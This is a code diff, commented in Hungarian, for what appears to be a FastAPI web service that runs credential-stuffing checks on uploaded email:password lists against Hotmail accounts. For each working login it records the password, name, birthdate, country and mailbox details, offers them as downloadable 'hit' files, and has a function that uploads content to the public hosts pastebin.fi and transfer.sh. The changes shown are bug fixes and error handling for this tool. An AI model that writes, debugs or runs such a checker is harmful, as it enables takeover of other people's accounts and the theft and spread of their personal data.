@@ -30,6 +30,7 @@ def upload_to_external_api(content: str, filename: str) -> str:
     if not content or len(content.strip()) == 0: 
         return None
     
+    # 1. Opció: Pastebin.fi
     try:
         res = requests.post("https://pastebin.fi/documents", data=content.encode('utf-8'), timeout=5)
         if res.status_code == 200:
@@ -37,6 +38,7 @@ def upload_to_external_api(content: str, filename: str) -> str:
             return f"https://pastebin.fi/raw/{key}"
     except: pass
     
+    # 2. Opció: Transfer.sh
     try:
         res = requests.put(f"https://transfer.sh/{filename}", data=content.encode('utf-8'), timeout=8)
         if res.status_code == 200:
@@ -120,8 +122,6 @@ async def start_checker(file: UploadFile, keyword: str = Form(...), speed: float
     if not lines: raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor")
     
     user_id = str(current_user["_id"])
-    
-    # 🔴 ITT JAVÍTOTTAM A TÖRLÉST! Előbb létrehozzuk az újat, majd töröljük a régit 🔴
     run_id = await create_run(user_id, keyword, len(lines))
     await delete_old_runs(user_id, run_id)
     
@@ -160,7 +160,6 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
         if result["status"] == "hit":
             hits += 1
             d = result["data"]
-            # 🟢 BEKERÜLT A DÁTUM A KIMENTETT TXT FÁJLBA 🟢
             lt = f"{d['email']}:{d['password']} | Country={d['country']} | Name={d['name']} | Birthdate={d['birthdate']} | Mails={d['mails']} | LastMail={d['date']}"
             await add_result_to_run(run_id, "hit", lt)
             await add_result_details_to_run(run_id, "hit", d)
@@ -234,7 +233,7 @@ async def download_direct(run_id: str, type: str):
     return PlainTextResponse(content="\n".join(lines) if lines else "Nincs eredmény", headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'})
 
 # ============================================================
-# WEBSOCKET
+# WEBSOCKET (JAVÍTOTT HIBATŰRÉSSEL)
 # ============================================================
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket, token: str = ""):
@@ -255,15 +254,19 @@ async def websocket_endpoint(websocket: WebSocket, token: str = ""):
     if active_run:
         active_run["_id"] = str(active_run["_id"])
         active_run["started_at"] = active_run["started_at"].isoformat()
-        await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
-        for hit in active_run.get("hit_details", []): await websocket.send_text(json.dumps({"type": "live_hit", "data": hit}))
-        for custom in active_run.get("custom_details", []): await websocket.send_text(json.dumps({"type": "live_custom", "data": custom}))
+        try:
+            await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
+            for hit in active_run.get("hit_details", []): await websocket.send_text(json.dumps({"type": "live_hit", "data": hit}))
+            for custom in active_run.get("custom_details", []): await websocket.send_text(json.dumps({"type": "live_custom", "data": custom}))
+        except:
+            pass
     
     try:
         while True:
             data = await websocket.receive_text()
             if data == "ping": await websocket.send_text("pong")
-    except WebSocketDisconnect:
+    # 🟢 ITT VAN A JAVÍTÁS: A BÖNGÉSZŐ/TELEFON LEKAPCSOLÁSÁT CSENDBEN KEZELJÜK 🟢
+    except (WebSocketDisconnect, RuntimeError, Exception):
         with ws_lock:
             if user_id in user_connections and ws_info in user_connections[user_id]:
                 user_connections[user_id].remove(ws_info)
